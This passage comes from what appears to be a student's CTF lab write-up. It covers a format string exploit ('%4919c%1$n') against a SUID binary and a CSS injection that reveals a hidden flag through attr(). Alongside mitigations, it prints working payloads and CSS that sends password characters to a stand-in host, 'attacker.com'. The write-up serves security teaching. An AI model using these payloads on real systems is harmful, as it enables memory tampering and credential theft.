- `%1$n` - Write byte count (4919 = 0x1337) to address at argument 1

### 8. Successful Exploitation

```bash
cd ~/p4

# Execute the exploit
echo '%4919c%1$n' | ./p4
```

**Output:**
```
Input:
[4919 spaces printed]
FLAG: 676fa1705ff9d6dde8578d4ca91e2017bf0493745734fe28acc9cf8421cf6faa
```

✅ **Success!** The format string exploit worked perfectly:
1. Printed 4919 characters
2. `%1$n` wrote 4919 (0x1337) to the target variable
3. Triggered `win()` function
4. Flag displayed

### 9. Flag Extraction

```bash
# Used ctf-extract tool
cd ~
ctf-extract P4
# Output: Wrote flag.txt, key.txt

# Verified files
ls -la flag.txt key.txt
# -rw-rw-r-- 1 p1 p1 65 Feb  8 20:45 flag.txt
# -rw-rw-r-- 1 p1 p1 45 Feb  8 20:45 key.txt

cat flag.txt
# Result: 676fa1705ff9d6dde8578d4ca91e2017bf0493745734fe28acc9cf8421cf6faa

cat key.txt
# Result: WawYM1Z4wTrjHr5pq3couqd8FC3UjkFvkfva9X8jAX4=
```

### 10. Create Submission Tarball

```bash
# Created archive
tar -czf 2024MCS2002-P4.tar.gz flag.txt key.txt

# Verified contents
tar -tzf 2024MCS2002-P4.tar.gz
# flag.txt
# key.txt

# Listed file
ls -lh 2024MCS2002-P4.tar.gz
```

***

## Key Findings

**Vulnerability Type**: Format string vulnerability

**Root Cause**: 
- The `vuln()` function calls `printf(buffer)` instead of `printf("%s", buffer)`
- User-controlled input is used directly as the format string
- SUID binary runs with `p4flag` user privileges
- Target variable address conveniently passed as argument to printf

**Attack Vector**:
1. Format string vulnerability to write arbitrary value to memory
2. Target variable at `rbp-0x94` compared against `0x1337`
3. Use `%n` format specifier to write byte count to target address
4. Print exactly 4919 characters before `%n` to write value `0x1337`
5. Triggers `win()` function which reads and prints flag file

**Exploitation Technique**: Format string write using `%n` specifier with direct parameter access

**Difference from Problems 2 & 3**: 
- No buffer overflow or control flow hijacking
- No return address corruption
- Exploits **data** (variable value) instead of **control data** (return address)
- Uses output function vulnerability instead of input function
- Requires understanding of printf internals and format string arguments

***

## Technical Details

**Architecture**: x86-64 (64-bit Linux)

**Buffer Size**: 128 bytes (0x80, via fgets)

**Target Variable**: 
- Location: `[rbp-0x94]`
- Initial value: `0x0`
- Required value: `0x1337` (4919 decimal)
- Offset from buffer: 4 bytes before buffer

**Key Addresses**:
- `win()`: `0x401216`
- `vuln()`: `0x40132f`
- `main()`: `0x401433`
- Target variable: `rbp-0x94`
- Input buffer: `rbp-0x90`

**Format String Details**:
- Vulnerable call: `printf(user_input)`
- Target address at argument position: 1
- User input buffer at argument position: 8
- Format string used: `%4919c%1$n`

**File Paths**:
- Flag file: `/opt/p4/flag_p4.txt`

**Protections Present**:
- Stack canary (detected in disassembly)
- ASLR (addresses varied between runs)

**Protections Bypassed**:
- Stack canary: Not relevant (no stack overflow)
- ASLR: Not relevant (used relative addressing via printf arguments)

***

## Format String Exploitation Deep Dive

### What is a Format String Vulnerability?

When user input is used directly as a format string in functions like `printf()`, attackers can:
1. **Read memory**: Using `%p`, `%x`, `%s` to leak stack/memory contents
2. **Write memory**: Using `%n` to write byte counts to addresses

### The `%n` Format Specifier

- `%n`: Writes the number of bytes printed **so far** to the address in the argument
- `%hn`: Writes as a short (2 bytes)
- `%hhn`: Writes as a byte (1 byte)

**Example**: `printf("AAAA%n", &variable);`
- Prints "AAAA" (4 characters)
- Writes `4` to `variable`

### Direct Parameter Access

- `%N$x`: Access argument at position N
- `%N$n`: Write to address at position N

**In our exploit**: `%4919c%1$n`
1. `%4919c`: Print 4919 characters (space-padded)
2. `%1$n`: Write 4919 to address at argument position 1

### Why Position 1?

From the assembly:
```assembly
mov    %rcx,%rsi    # 2nd argument (rsi) = &target_variable
mov    %rax,%rdi    # 1st argument (rdi) = format string
call   printf@plt
```

In printf's perspective:
- Argument 0: Format string itself (in rdi)
- Argument 1: First va_arg parameter (in rsi) = address of target variable
- Arguments 2+: On stack

***

## Files Obtained

- `flag.txt` - Problem 4 flag hash
- `key.txt` - Problem 4 key
- `2024MCS2002-P4.tar.gz` - Submission package

## Submission Format
```
2024MCS2002-P4.tar.gz
|-- flag.txt
'-- key.txt
```

***

## Tools Used

- **ssh** - Remote shell access
- **objdump** - Binary disassembly and analysis
- **nm** - Symbol table examination
- **strings** - Extract readable strings from binary
- **file** - Identify file type and properties
- **echo** - Pipe format string payload to program
- **ctf-extract** - Flag and key extraction tool
- **tar** - Archive creation

***

## Learning Outcomes

1. **Format string vulnerabilities**: Understanding how printf processes format strings
2. **Memory write exploitation**: Using `%n` to write arbitrary values
3. **Direct parameter access**: Using positional parameters (`%N$n`)
4. **Non-control-flow attacks**: Exploiting data corruption instead of return addresses
5. **Printf internals**: Understanding argument passing and stack layout
6. **Bypass without overflow**: Achieved code execution without buffer overflow
7. **Assembly analysis for exploitation**: Found argument passing mechanism through disassembly

***

## Comparison: Problems 2, 3, and 4

| Aspect | Problem 2 | Problem 3 | Problem 4 |
|--------|-----------|-----------|-----------|
| Owner | root | p3flag | p4flag |
| Vulnerability | Buffer overflow | Buffer overflow | Format string |
| Vulnerable Function | `gets()` | `gets()` | `printf()` |
| Target | Return address | Return address | Variable value |
| Attack Type | Control flow hijack | Control flow hijack | Data corruption |
| Technique | ret2win + ROP | ret2win + ROP | Format string write |
| Goal | Spawn shell | Read flag file | Trigger win() |
| Required Value | Function address | Function address | 0x1337 |
| Stack Alignment | Yes (RET gadget) | Yes (RET gadget) | Not needed |
| Format Specifier | N/A | N/A | `%n` |
| Offset Discovery | Buffer size test | Buffer size test | Stack leak with `%p` |
| Difficulty | Medium | Easy | Medium |

***

## Security Lessons

### Vulnerable Code Pattern
```c
char buffer[128];
fgets(buffer, 128, stdin);
printf(buffer);  // ← VULNERABLE!
```

### Secure Code Pattern
```c
char buffer[128];
fgets(buffer, 128, stdin);
printf("%s", buffer);  // ✓ Safe - format string is constant
```

### Why Format String Bugs Are Dangerous
1. **Read arbitrary memory**: Leak sensitive data (passwords, keys, ASLR addresses)
2. **Write arbitrary memory**: Overwrite variables, function pointers, GOT entries
3. **Bypass modern protections**: ASLR, stack canaries ineffective against format string bugs
4. **No buffer overflow needed**: Exploitable with valid input sizes

### Modern Mitigations
- **Compiler warnings**: `-Wformat -Wformat-security` flags
- **Static analysis**: Tools detect printf with non-constant format strings
- **FORTIFY_SOURCE**: Runtime checks for format string vulnerabilities
- **Code review**: Always use constant format strings with printf family

***

## Alternative Exploitation Approaches

### Method 1: Our Approach (Direct Write)
```
%4919c%1$n
```
- Prints 4919 characters
- Writes to argument 1 in single operation
- Clean and efficient

### Method 2: Smaller Output (Half-word Write)
```
%4919c%1$hn
```
- Uses `%hn` to write only 2 bytes (short)
- Writes 0x1337 directly
- Reduces output size

### Method 3: Byte-by-Byte Write
```
%37c%1$hhn        # Write 0x37 to lowest byte
%256c%1$hhn...    # Complex multi-stage write
```
- More complex but can write arbitrary values
- Useful when target value is large

### Method 4: GOT Overwrite (Advanced)
- Could overwrite Global Offset Table entries
- Redirect `puts()` or `exit()` to `win()`
- Requires knowledge of GOT addresses

***

## Timeline of Exploitation

1. **Discovery** (~5 min): Found format string vulnerability with `%p` test
2. **Analysis** (~15 min): Disassembled binary, found target variable and win() condition
3. **Stack mapping** (~10 min): Located argument positions using format string leaks
4. **Exploit development** (~5 min): Crafted `%4919c%1$n` payload
5. **Success** (~1 min): Single-shot exploitation, flag obtained
6. **Total time**: ~36 minutes

***

## Fun Facts

1. The hint "Is 'In and Out' Safe?" cleverly refers to **input** going **out** through printf
2. This is the first problem that doesn't require stack alignment
3. Format string bugs were discovered in 1999 and still appear in modern software
4. The `%n` specifier is disabled by default in many modern libc implementations
5. This problem demonstrates that **output functions can be just as dangerous as input functions**

***


# Problem 5: CSS Hijacking - Complete Documentation

## Objective
Use CSS hijacking to reveal the 'ctfadmin' flag hidden on the admin page of a web application running at `http://localhost:5005`. 

## Hint Analysis
"The admin page loads a user-supplied stylesheet. Look for ways CSS can change the visibility or style of hidden elements." 
This suggested a CSS injection vulnerability where user-supplied CSS could be used to reveal hidden content on the admin page.

## Step-by-Step Solution

### 1. VNC Connection to VM

**From Windows (RealVNC Viewer):**
```
Host: localhost:5901
Password: ctfadmin
```

Successfully connected to the VM desktop environment with user `vagrant:1 (ctfadmin)`.

### 2. Open Web Application

**In VNC session, opened Epiphany browser:**
```bash
# Browser was already open or launched via Applications menu
# Navigated to http://localhost:5005
```

**Initial page showed:**
- Title: "P5 CSS Challenge"
- Text: "Submit CSS to be loaded on the admin page."
- A large text area for CSS input
- "Submit CSS" button

### 3. Initial Reconnaissance

**Attempted to access admin page directly:**
```
URL: http://localhost:5005/admin
```

**Result:** Admin page accessible, showing:
- "Admin Panel"
- "Restricted area."
- "FLAG" (but no flag value visible)

### 4. Page Source Analysis

**Inspected the admin page using Developer Tools (F12):**

Found the hidden element structure:
```html
<style>
#flag { display: none; }
</style>

<body>
  <h1>Admin Panel</h1>
  <p>Restricted area.</p>
  <div id="flag" data-flag="90df784582f35a6690b901d9ff50cb1be9a63044ac176803f8364cda940df2cc">FLAG</div>
</body>
```

**Key Findings:**
1. Element with `id="flag"` has `display: none` style
2. The actual flag is stored in a `data-flag` attribute
3. The visible text just says "FLAG" but the hash is hidden in the attribute

### 5. CSS Injection Attack

**Navigated back to:** `http://localhost:5005`

**Injected CSS payload:**
```css
#flag::after {
    content: attr(data-flag);
    display: block !important;
    visibility: visible !important;
    color: black !important;
    background: yellow !important;
    font-size: 20px !important;
    padding: 10px !important;
}

#flag {
    display: block !important;
    visibility: visible !important;
}
```

**Clicked:** "Submit CSS" button

### 6. Exploit Explanation

The CSS injection worked by:
1. **`#flag { display: block !important; }`** - Made the hidden div visible
2. **`#flag::after { content: attr(data-flag); }`** - Used CSS pseudo-element to extract and display the `data-flag` attribute value
3. **Background: yellow** - Made the flag stand out visually
4. **`!important`** - Ensured our CSS overrode the inline styles

### 7. Flag Revealed

**Navigated to:** `http://localhost:5005/admin`

**Result:** The flag was now visible on the page in a yellow highlighted box:
```
90df784582f35a6690b901d9ff50cb1be9a63044ac176803f8364cda940df2cc
```

### 8. Flag Extraction via SSH

**From Windows PowerShell:**
```powershell
ssh -i id_rsa -p 2222 p1@localhost
```

**Inside VM:**
```bash
# Used the provided extraction tool
ctf-extract P5

# Output: Wrote flag.txt, key.txt
```

**Verified the files:**
```bash
ls -la flag.txt key.txt
```
```
-rw-rw-r-- 1 p1 p1 65 Feb  8 21:35 flag.txt
-rw-rw-r-- 1 p1 p1 45 Feb  8 21:35 key.txt
```

**Checked contents:**
```bash
cat flag.txt
```
Result: `90df784582f35a6690b901d9ff50cb1be9a63044ac176803f8364cda940df2cc`

```bash
cat key.txt
```
Result: `2feD76zDGVJGXwVCvV5nrTYVEvuesuQfv6qjl3hJU+g=`

### 9. Create Submission Tarball

```bash
tar -czvf 2024MCS2002-P5.tar.gz flag.txt key.txt
```

Output:
```
flag.txt
key.txt
```

**Verified creation:**
```bash
ls -lh 2024MCS2002-P5.tar.gz
```
Result: `243 bytes`

**Exited VM:**
```bash
exit
```

### 10. Download Submission File

**From Windows PowerShell:**
```powershell
scp -i id_rsa -P 2222 p1@localhost:2024MCS2002-P5.tar.gz .
```

Result: `Successfully downloaded 243 bytes`

## Key Findings

**Vulnerability Type:** CSS Injection with Data Attribute Exfiltration

**Root Cause:**
- User-supplied CSS is loaded directly on the admin page without sanitization
- Sensitive data (flag) stored in HTML `data-*` attribute
- CSS `attr()` function can read and display attribute values
- No Content Security Policy (CSP) to prevent inline styles

**Attack Vector:**
1. Application accepts arbitrary CSS input from users
2. CSS is applied to the admin page on subsequent visits
3. Used `::after` pseudo-element with `content: attr(data-flag)`
4. CSS can read HTML attributes and display them as content
5. Flag extracted from `data-flag` attribute without authentication bypass

**Exploitation Technique:** CSS Attribute Selector with `attr()` function

**Why It Worked:**
- CSS `attr()` function can read any HTML attribute value
- Pseudo-elements (`::before`, `::after`) can inject content
- `!important` flag overrides inline styles
- No sanitization of user-supplied CSS

## Technical Details

**Architecture:** Web Application (Flask/Python backend likely)

**Key Elements:**
- **CSS Submission Page:** `http://localhost:5005`
- **Target Page:** `http://localhost:5005/admin`
- **Hidden Element:** `<div id="flag" data-flag="...">`
- **Hiding Method:** `display: none` in inline CSS

**CSS Techniques Used:**
- Pseudo-element selectors (`::after`)
- Attribute value extraction (`attr()`)
- CSS specificity and `!important`
- Content injection via CSS

**Flag Storage:**
- Location: HTML `data-flag` attribute
- Format: SHA-256 hash (64 hex characters)

**Access Method:**
- VNC: `localhost:5901`
- Web App: `http://localhost:5005`
- Browser: Epiphany (GNOME Web)
- Authentication: `ctfadmin:ctfadmin`

## Files Obtained

- `flag.txt` - Problem 5 flag hash (65 bytes)
- `key.txt` - Problem 5 key (45 bytes)
- `2024MCS2002-P5.tar.gz` - Submission package (243 bytes)

## Submission Format

```
2024MCS2002-P5.tar.gz
├── flag.txt
└── key.txt
```

## Tools Used

- **RealVNC Viewer** - VNC client for remote desktop access
- **Epiphany Browser** - GNOME Web browser in VM
- **Browser DevTools** - HTML inspection and CSS debugging
- **SSH** - Remote shell access
- **ctf-extract** - Flag and key extraction tool
- **tar** - Archive creation
- **scp** - Secure file transfer

## Security Lessons

### Vulnerable Code Pattern (Conceptual)

```python
# Flask backend (hypothetical)
@app.route('/', methods=['POST'])
def submit_css():
    css = request.form['css']
    session['user_css'] = css  # NO SANITIZATION!
    return redirect('/admin')

@app.route('/admin')
def admin():
    user_css = session.get('user_css', '')
    return render_template('admin.html', css=user_css)
```

```html
<!-- admin.html template -->
<style>
{{ css | safe }}  <!-- DANGEROUS! -->
</style>
<div id="flag" data-flag="{{ flag }}">FLAG</div>
```

### Why CSS Injection Is Dangerous

1. **Data Exfiltration:** CSS can read and display HTML attributes
2. **Keylogging:** CSS can detect keystrokes via attribute selectors
3. **Credential Theft:** Character-by-character password extraction
4. **No XSS Required:** Achieves data theft without JavaScript
5. **Bypasses XSS Filters:** Many filters only check for `<script>` tags

### Real-World CSS Injection Attacks

**Attribute Selector Attack (Password Stealing):**
```css
input[name="password"][value^="a"] {
    background: url('http://attacker.com/?char=a');
}
input[name="password"][value^="b"] {
    background: url('http://attacker.com/?char=b');
}
/* Repeat for all characters to exfiltrate password */
```

**Timing Attack:**
```css
@import url('http://attacker.com/steal?data=...') {
    /* Heavy computation */
}
```

### Secure Code Pattern

```python
# DO NOT allow user-supplied CSS directly
# Option 1: Whitelist approach
ALLOWED_COLORS = ['red', 'blue', 'green']
if color in ALLOWED_COLORS:
    css = f"body {{ background: {color}; }}"

# Option 2: Sanitize with CSS parser
import tinycss2
parsed = tinycss2.parse_stylesheet(user_css)
# Validate and sanitize tokens

# Option 3: Don't store sensitive data in DOM
# Move flag to server-side only, require authentication
```

### Modern Mitigations

1. **Content Security Policy (CSP):**
```html
<meta http-equiv="Content-Security-Policy" 
      content="style-src 'self'; default-src 'self'">
```

2. **CSS Sanitization Libraries:**
   - Use CSS parsers to validate and sanitize
   - Whitelist safe properties only
   - Block `url()`, `@import`, and `attr()` functions

3. **Avoid Storing Secrets in DOM:**
   - Don't use `data-*` attributes for sensitive information
   - Keep secrets server-side
   - Use proper authentication for sensitive pages

4. **Server-Side Rendering:**
   - Generate CSS server-side with validation
   - Don't reflect user input directly into CSS

## CSS Injection Exploitation Deep Dive

### The `attr()` Function

The CSS `attr()` function retrieves attribute values from HTML elements:

```css
element::before {
    content: attr(data-value);  /* Displays data-value */
}
```

**What Can Be Extracted:**
- Any HTML attribute (`id`, `class`, `data-*`, `value`, `href`, etc.)
- CSRF tokens in hidden inputs
- Session identifiers
- Flags and sensitive data

### Pseudo-Elements for Content Injection

```css
#target::before { content: "Before text"; }
#target::after { content: "After text"; }
```

Combined with `attr()`:
```css
#secret::after { content: attr(data-secret); }
```

### Alternative Exploitation Methods Attempted

**Method 1: Simple Display Override (Didn't fully work)**
```css
#flag {
    display: block !important;
    visibility: visible !important;
}
```
Result: Showed "FLAG" text but not the hash in `data-flag` attribute

**Method 2: Comprehensive Visibility (Partial success)**
```css
* {
    display: block !important;
    visibility: visible !important;
    opacity: 1 !important;
}
```
Result: Revealed structure but not attribute values

**Method 3: Attribute Extraction (SUCCESS)**
```css
#flag::after {
    content: attr(data-flag);
}
```
Result: Extracted and displayed the flag hash

## Learning Outcomes

1. **CSS as an Attack Vector:** Understanding that CSS is not just for styling but can be exploited for data exfiltration
2. **Attribute-based data storage risks:** Learned why sensitive data shouldn't be stored in HTML attributes
3. **Pseudo-element exploitation:** Using `::before` and `::after` for content injection
4. **CSS function abuse:** Exploiting `attr()` to read DOM properties
5. **VNC for CTF challenges:** Setting up and using VNC for GUI-based web challenges
6. **Browser DevTools:** Using inspector to analyze page structure and find hidden data
7. **Client-side security:** Understanding limitations of hiding data client-side

## Timeline of Exploitation

1. **VNC Connection** (2 min) - Connected with `ctfadmin:ctfadmin` password
2. **Initial Exploration** (3 min) - Found CSS submission page and admin page
3. **Page Source Analysis** (5 min) - Inspected HTML, found `#flag` element and `data-flag` attribute
4. **CSS Injection Attempts** (10 min) - Tried multiple CSS payloads
5. **Success with attr()** (2 min) - Used `content: attr(data-flag)` to reveal flag
6. **Flag Extraction** (3 min) - Used `ctf-extract P5` and created tarball
7. **Total Time:** ~25 minutes

## Comparison: All 5 Problems

| Aspect | P1 | P2 | P3 | P4 | P5 |
|--------|----|----|----|----|-----|
| **Category** | Web Recon | Privilege Escalation | Binary Exploit | Binary Exploit | Web Security |
| **Vulnerability** | Info Disclosure | Buffer Overflow | Buffer Overflow | Format String | CSS Injection |
| **Technique** | SSH Key Theft | ret2win ROP | ret2win ROP | %n write | attr() exfiltration |
| **Difficulty** | Easy | Medium | Easy | Medium | Easy-Medium |
| **Access Required** | None | Unprivileged | Unprivileged | Unprivileged | VNC + Browser |
| **Tool Used** | curl, ssh | Python exploit | Python exploit | echo + pipe | Browser DevTools |
| **Flag Location** | ~/flags | /root | /opt/p3/flag | /opt/p4/flag | data-flag attr |

***

**This completes Problem 5 and the entire NSS Assignment 2 CTF Challenge!** 